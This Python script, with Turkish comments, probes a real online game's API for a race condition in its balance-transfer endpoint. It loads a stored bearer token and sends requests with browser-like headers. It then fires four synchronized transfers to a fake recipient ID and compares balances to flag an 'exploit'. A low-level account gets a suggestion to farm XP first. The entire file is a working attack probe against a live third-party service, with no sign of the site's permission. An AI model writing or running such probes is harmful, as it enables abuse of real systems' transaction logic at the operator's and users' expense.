#!/usr/bin/env python3
"""Lv5+ ise transfer paralel race; değilse seviye/XP raporu."""
from __future__ import annotations

import json
import sys
import threading
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / "output" / "reverse"
AUTH = Path("/root/diplomacia-auth.json")
BASE = "https://diplomacia.com.tr/api"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
DELAY = 3.5


def load() -> tuple[str, str]:
    a = json.loads(AUTH.read_text())
    return a["token"], a["player_id"]


def api(method: str, path: str, token: str, body: dict | None = None) -> dict:
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/json",
        "User-Agent": UA,
        "Origin": "https://diplomacia.com.tr",
        "Referer": "https://diplomacia.com.tr/",
    }
    data = json.dumps(body).encode() if body is not None else None
    if body is not None:
        headers["Content-Type"] = "application/json"
    time.sleep(DELAY)
    req = urllib.request.Request(BASE + path, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return {"status": r.status, "data": json.loads(r.read().decode())}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "data": json.loads(e.read().decode())}


def main() -> int:
    OUT.mkdir(parents=True, exist_ok=True)
    token, my_id = load()
    prof = api("GET", "/players/profile", token)
    player = prof["data"].get("player", {})
    level = int(player.get("level") or 0)
    xp = int(player.get("xp") or 0)
    balance_before = int(player.get("balance") or 0)

    report: dict = {
        "ts": datetime.now(timezone.utc).isoformat(),
        "username": player.get("username"),
        "level": level,
        "xp": xp,
        "min_transfer_level": 5,
        "race_ran": False,
    }

    if level < 5:
        report["status"] = "skipped"
        report["reason"] = f"lv{level} < 5 — önce farm/quest ile level atla"
        report["suggestion"] = "Telegram: `farm yap` veya günlük/görev XP"
    else:
        fake = "00000000-0000-0000-0000-000000000099"
        outcomes: list[dict] = []
        barrier = threading.Barrier(4)

        def send_once(i: int):
            try:
                barrier.wait(timeout=10)
                headers = {
                    "Authorization": f"Bearer {token}",
                    "Content-Type": "application/json",
                    "User-Agent": UA,
                    "Origin": "https://diplomacia.com.tr",
                }
                body = json.dumps({"recipient_id": fake, "amount": 100}).encode()
                req = urllib.request.Request(
                    BASE + "/transfer/send", data=body, headers=headers, method="POST"
                )
                with urllib.request.urlopen(req, timeout=25) as r:
                    outcomes.append({"thread": i, "status": r.status})
            except urllib.error.HTTPError as e:
                outcomes.append({"thread": i, "status": e.code, "body": e.read().decode()[:150]})
            except Exception as ex:
                outcomes.append({"thread": i, "error": str(ex)})

        threads = [threading.Thread(target=send_once, args=(i,)) for i in range(4)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        time.sleep(DELAY)

        prof2 = api("GET", "/players/profile", token)
        balance_after = int(prof2["data"].get("player", {}).get("balance") or 0)
        report["race_ran"] = True
        report["outcomes"] = outcomes
        report["balance_before"] = balance_before
        report["balance_after"] = balance_after
        report["balance_delta"] = balance_after - balance_before
        report["race_exploit"] = balance_before - balance_after > 100
        report["status"] = "exploit" if report["race_exploit"] else "ok"

    out = OUT / "transfer_race_probe.json"
    out.write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
    print(json.dumps(report, ensure_ascii=False, indent=2))
    print(f"saved {out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
